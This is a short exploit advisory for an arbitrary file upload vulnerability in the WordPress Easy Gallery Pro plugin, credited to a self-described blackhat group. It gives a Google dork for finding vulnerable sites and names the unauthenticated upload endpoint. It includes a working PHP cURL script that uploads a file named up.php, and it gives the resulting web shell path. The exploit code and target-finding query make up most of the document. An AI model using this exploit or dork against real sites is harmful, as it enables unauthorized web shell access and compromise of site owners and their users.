#####################################################
# Exploit Title: WordPress Easy Gallery Pro Arbitrary File Upload

# Google Dork: allinurl:/wp-content/plugins/wp-easy-gallery-pro/

# Date: 14/09/2013

# Vendor Homepage: http://labs.hahncreativegroup.com/

# Author: Byakuya Kouta

# Facebook : https://www.facebook.com/fiber.linux

# FB Page : https://www.facebook.com/CodeNewbieCrew

#Exploitation-Technique : Remote

#Proof of Concept :
The arbitrary file upload web vulnerability can be exploited by remote
attackers without user interaction or privileged application user account.

#Severity : High

#Vuln Page :
http://localhost/wp-content/plugins/wp-easy-gallery-pro/admin/php.php

#Exploit :

easy-gallery-pro.php

<?php

/****************
Facebook : fb.com/fiber.linux
Page     : fb.com/CodeNewbieCrew
Blog     : blog.03xa.ml
*****************/

$uploadfile="up.php";
$ch = curl_init("
http://localhost/wp-content/plugins/wp-easy-gallery-pro/admin/php.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('qqfile'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

#Shell Access : http://localhost/wp-content/uploads/up.php

#Risk : The security risk of the arbitrary file upload web vulnerability is
estimated as high.

#Credit : Code Newbie Team - Malaysia & Indonesia BlackHat
Byakuya | Cai | Lord Router | Ops Msia Bersatu | Clound | Agam | Encik
Linux | X-Tuned and all official Code-Newbie Member

#####################################################
